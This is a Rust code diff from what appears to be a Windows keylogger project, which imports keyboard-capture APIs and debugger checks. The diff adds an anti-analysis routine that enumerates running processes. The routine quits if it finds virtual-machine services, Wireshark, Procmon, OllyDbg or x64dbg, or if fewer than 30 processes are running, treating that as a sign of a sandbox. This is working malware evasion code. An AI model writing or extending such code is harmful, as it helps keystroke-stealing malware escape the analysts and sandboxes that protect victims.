@@ -9,7 +9,6 @@ use crate::encode::{self, Encode};
 use std::path::PathBuf;
 use rand::{rngs::StdRng, SeedableRng, Rng};
 use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
-use raw_cpuid::{cpuid, CpuId};
 
 use windows::Win32::Foundation::{
     HWND, LPARAM, LRESULT, WPARAM
@@ -54,6 +53,11 @@ use windows::Win32::UI::WindowsAndMessaging::{
 use windows::Win32::UI::Input::KeyboardAndMouse::{
 
     GetKeyState, GetKeyboardState, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VK_CAPITAL, VK_SHIFT
+};
+
+use windows::Win32::System::Diagnostics::ToolHelp::{
+    CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next, TH32CS_SNAPPROCESS
+
 };
 
 // creates a global encoder
@@ -255,23 +259,53 @@ pub fn check_for_debugging(){
 }
 
 //anti VM
-pub fn check_for_vm(){
-    let cpuid = CpuId::new();
+pub fn check_for_process(){
 
-    if let Some(info) = cpuid.get_hypervisor_info(){
-       let vm = info.identify();
+    let warry_process = vec!["vboxservice.exe", "vmtoolsd.exe","wireshark.exe", "procmon.exe", "ollydbg.exe","x64dbg.exe"];
 
-                match vm {
-                    raw_cpuid::Hypervisor::Xen => println!("Hypervisor vendor: Xen"),
-                    raw_cpuid::Hypervisor::VMware => println!("Hypervisor vendor: VMware"),
-                    raw_cpuid::Hypervisor::HyperV => println!("Hypervisor vendor: Hyper-V"),
-                    raw_cpuid::Hypervisor::Bhyve => println!("Hypervisor vendor: Bhyve"),
-                    raw_cpuid::Hypervisor::Unknown(id,_,_) => println!("Hypervisor vendor: Unknown ({})", id),
-                    raw_cpuid::Hypervisor::KVM => todo!(),
-                    raw_cpuid::Hypervisor::QEMU => todo!(),
-                    raw_cpuid::Hypervisor::QNX => todo!(),
-                    raw_cpuid::Hypervisor::ACRN => todo!(),
-                    _ => println!("Nothing")
+      unsafe {
+        // Take a snapshot of all processes
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
+        let mut num_process = 0;
+
+        // Initialize PROCESSENTRY32 struct
+        let mut pe32 = PROCESSENTRY32::default();
+        pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
+
+        // Get first process
+        if Process32First(snapshot, &mut pe32).is_ok() {
+            loop {
+                num_process += 1;
+                // Convert process name from WCHAR to Rust String
+                let process_name = ansi_to_string(&pe32.szExeFile);
+
+                // println!("Process ID: {}, Name: {}", pe32.th32ProcessID, process_name);
+
+                if warry_process.contains(&process_name.as_str()){
+                    println!("Found process that are bad: {}", process_name);
+                    process::exit(1);
                 }
+
+                if !Process32Next(snapshot, &mut pe32).is_ok() {
+                    break;
+                }
+            }
+        }
+
+        //if there is a small amount of process detected, exit
+        //could be a sandbox
+        if num_process < 30{
+            println!("Too little process detected {}", num_process);
+            std::process::exit(1);
+        }
+
+        
     }
+}
+
+fn ansi_to_string(bytes: &[i8]) -> String {
+    let nul_pos = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
+    let u8_slice = &bytes[..nul_pos];
+    let u8_slice = u8_slice.iter().map(|&b| b as u8).collect::<Vec<u8>>();
+    String::from_utf8_lossy(&u8_slice).to_string()
 }
